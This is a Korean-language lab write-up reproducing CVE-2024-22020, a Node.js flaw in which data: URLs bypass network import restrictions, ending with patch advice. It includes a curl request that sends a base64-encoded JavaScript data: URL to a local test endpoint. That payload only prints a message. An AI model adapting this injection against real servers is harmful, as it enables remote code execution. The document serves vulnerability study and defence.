# CVE-2024-22020 - Bypass network import restriction via data URL

<br/>

### 요약
- Network import는 Node.js에서 다른 서버나 URL로부터 자바스크립트 모듈을 동적으로 불러와 실행하는 기능
- Node.js에서는 `import()` 사용 시 보안을 위해 network import를 제한하지만, `data:` URL을 사용하면 이 제한을 우회할 수 있는 취약점이 존재
- 이로 인해 공격자는 악성 코드를 동적으로 실행할 수 있으며, 시스템의 무결성과 가용성에 심각한 영향을 줄 수 있다.


<br/>
<br/>

### 환경 구성 및 실행
- 테스트 서버는 **Node.js 20.11.0** 버전을 사용하여 Docker로 구성
- 'docker compose up --build' 를 실행하여 테스트 환경 실행
- 아래는 실행 결과 화면이며, 서버가 정상적으로 실행된 것을 확인
<img width="893" alt="image1" src="https://github.com/user-attachments/assets/6fe35900-2710-4f1c-af08-7773f1c37def" />
- `http://localhost:3000/import` 에 POST 요청을 보내 data: URL 형태의 자바스크립트 코드를 실행



<br/>
<br/>


### 결과
- `curl` 명령어로 테스트 요청을 보냄 
- 전달한 내용은 base64로 인코딩된 자바스크립트 코드이며 실제 내용은 아래와 같음
```bash
console.log("Executed from data:URL!");
```

```bash
curl -X POST http://localhost:3000/import \
  -H "Content-Type: application/json" \
  -d '{"url":"data:text/javascript;base64,Y29uc29sZS5sb2coIkV4ZWN1dGVkIGZyb20gZGF0YTpVUkwhIik7"}'
```
<img width="893" alt="image2" src="https://github.com/user-attachments/assets/449b0d88-44cd-40d7-9064-d8683113caa1" />



- 서버 로그에서 Executed from data:URL! 이라는 출력이 확인되었으며, 이는 base64로 전달된 자바스크립트 코드가 실제로 실행되었음을 의미한다.
<br/>
<br/>

### 정리
- CVE-2024-22020은 Node.js에서 `import()`를 사용할 때, `data:` URL을 통해 Network import 제한을 우회할 수 있는 보안 취약점이다.
- data URL은 외부 서버 통신 없이 자체 데이터만으로 코드를 실행할 수 있기 때문에, Node.js의 network import 제한 체크를 우회하는 데 사용될 수 있었다.
- RCE로 악용될 수 있으므로 심각한 보안 위협을 야기할 수 있다.
- 해당 취약점은 특정 버전(Node.js 18.19.0, 20.11.0, 21.6.1)에서 확인되며, 이후 버전에서는 `data:` URL을 통한 import가 차단되어 해당 취약점이 발생하지 않는다.
- 따라서 취약점을 예방하려면 Node.js를 최신 버전(v20.15.1 이상)으로 업데이트해야 하며, 사용자 입력을 기반으로 한 동적 `import()` 사용을 지양해야 한다.

<br/>
<br/>

### 참고
- https://www.cve.org/CVERecord?id=CVE-2024-22020
- https://hackerone.com/reports/2092749


